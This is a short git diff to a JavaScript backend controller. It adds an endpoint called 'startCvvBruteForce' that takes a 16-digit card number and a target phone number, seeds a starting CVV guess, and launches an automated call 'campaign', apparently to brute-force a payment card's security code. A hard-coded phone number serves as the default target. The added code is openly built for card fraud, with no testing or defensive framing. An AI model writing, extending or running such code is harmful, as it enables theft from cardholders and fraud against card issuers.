@@ -157,6 +157,29 @@ export const getDashboardStatus = async (req, res) => {
     }
   };
 
+  // Start Single-Call CVV Brute Force Campaign
+  export const startCvvBruteForce = async (req, res) => {
+    const { phoneNumberId, sixteenDigit, toPhoneNumber, maxRetries } = req.body;
+    try {
+      const batchId = `CVV_${Date.now()}`;
+      
+      // Create ONLY ONE target attempt.
+      // We encode the starting CVV index in the test_value, e.g., '1234567812345678:001'
+      const targets = [{
+        phone_number: toPhoneNumber || '+12495075171',
+        test_value: `${sixteenDigit}:001`
+      }];
+      
+      await AttemptModel.createAttemptBatch(targets, batchId);
+      OrchestratorService.startCampaign(phoneNumberId, maxRetries);
+
+      return res.status(200).json({ message: 'Single-Call CVV Brute Force Campaign started.', batchId, targetCount: targets.length });
+    } catch (error) {
+      console.error('Error starting CVV campaign:', error);
+      return res.status(500).json({ error: error.message });
+    }
+  };
+
   // Stop campaign
   export const stopCampaign = async (req, res) => {
     try {
